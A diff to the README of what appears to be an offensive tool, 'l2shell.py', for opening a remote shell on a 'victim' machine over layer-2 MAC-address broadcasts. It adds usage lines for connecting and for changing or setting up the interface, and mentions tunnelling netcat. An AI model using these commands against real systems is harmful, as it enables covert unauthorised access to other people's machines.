@@ -39,7 +39,17 @@ python l2shell.py -l -d <delay> -a <attacker_id> -s <session_id>
 
 ### Connect to Victim via Mac address - Victim responds with broadcasts
 ```
-python l2shell.py -c -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
+python l2shell.py -c/-l -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
+```
+
+### Change interface
+```
+python l2shell.py -c/-l -a <attacker_id> -s <session_id> -i <interface guid>
+```
+
+### setup interface
+```
+python l2shell.py -c -a <attacker_id> -s <session_id> -si
 ```
 
 ## L2Tunnel - Tunneling Netcat
